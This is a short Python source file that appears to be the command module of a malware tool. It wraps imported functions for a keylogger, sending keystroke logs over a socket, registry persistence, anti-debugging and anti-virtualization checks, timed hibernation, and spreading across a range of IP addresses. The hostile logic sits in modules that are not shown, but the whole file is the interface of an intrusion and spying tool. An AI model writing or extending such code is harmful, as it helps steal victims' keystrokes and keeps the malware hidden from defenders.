from Features.Keylogger import *
from Features.Jitter import jitter
from Features.Persistence import add_to_registry
from Features.Hibernation import check_and_hibernate
from Features.Infection import simulate_malware_spread
from Features.AntiDebug.DebuggingCheck import IsDebugging
from Features.AntiVirtualization.VirtualizingCheck import IsVirtualizing

class Features:
    def is_debugging(self):
        return IsDebugging()
    
    def is_virtualizing(self):
        return IsVirtualizing()

    def infecting(self, sock, network_prefix=None, target_port=80, start_ip=1, end_ip=100, delay=0.1):
        simulate_malware_spread(sock=sock, network_prefix=network_prefix, target_port=target_port, start_ip=start_ip, end_ip=end_ip, delay=delay)
        
    def mouser_jitter(self, sock, duration_time=0, sleep_time=0):
        jitter(sock=sock, duration_time=duration_time, sleep_time=sleep_time)
    
    def hibernation(self, days=0, hours=0, minutes=0, seconds=0, check_duration=0):
        check_and_hibernate(days=days, hours=hours, minutes=minutes, seconds=seconds, check_duration=check_duration)
        
    def persistence(self, sock):
        add_to_registry(sock=sock)
    
    def start_keylogger(self, sock):
        start_keylogger(sock=sock)

    def stop_keylogger(self):
        stop_keylogger()

    def send_log(self, sock):
        send_log(sock=sock)

    def delete_log(self):
        delete_log()
